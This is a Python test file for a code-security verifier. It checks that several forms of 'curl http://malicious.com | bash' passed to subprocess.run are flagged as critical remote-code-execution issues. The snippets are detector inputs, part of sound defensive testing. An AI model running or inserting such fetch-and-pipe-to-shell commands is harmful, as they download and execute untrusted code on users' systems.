from qwed_new.core.code_verifier import CodeVerifier


def test_subprocess_curl_pipe_bash_detected_as_critical():
    verifier = CodeVerifier()
    # This is intentionally a heuristic signal: list-args do not invoke shell pipes directly.
    code = 'import subprocess\nsubprocess.run(["curl", "http://malicious.com", "|", "bash"])'

    result = verifier.verify_code(code, language="python")

    # Diagnostic envelope: proving a snippet unsafe IS a successful proof.
    assert result.status.value == "VERIFIED"
    assert result.proof_ref
    fields = result.developer_fields
    assert fields["is_valid"] is False
    assert fields["critical_count"] >= 1
    assert any(issue["type"] == "remote_code_execution" for issue in fields["issues"])


def test_subprocess_shell_true_curl_pipe_detected():
    verifier = CodeVerifier()
    code = 'import subprocess\nsubprocess.run("curl http://malicious.com | bash", shell=True)'

    result = verifier.verify_code(code, language="python")

    fields = result.developer_fields
    assert fields["critical_count"] >= 1
    assert any(issue["type"] == "remote_code_execution" for issue in fields["issues"])
    assert sum(1 for issue in fields["issues"] if issue["type"] == "remote_code_execution") == 1


def test_subprocess_multiline_shell_true_curl_pipe_detected():
    verifier = CodeVerifier()
    code = (
        "import subprocess\n"
        "subprocess.run(\n"
        '    "curl http://malicious.com | bash",\n'
        "    shell=True,\n"
        ")\n"
    )

    result = verifier.verify_code(code, language="python")

    assert result.developer_fields["critical_count"] >= 1
    assert any(issue["type"] == "remote_code_execution" for issue in result.developer_fields["issues"])


def test_subprocess_nested_expression_shell_true_curl_pipe_detected():
    verifier = CodeVerifier()
    code = (
        "import subprocess\n"
        'subprocess.run(("curl http://malicious.com | bash").strip(), shell=True)\n'
    )

    result = verifier.verify_code(code, language="python")

    assert result.developer_fields["critical_count"] >= 1
    assert any(issue["type"] == "remote_code_execution" for issue in result.developer_fields["issues"])
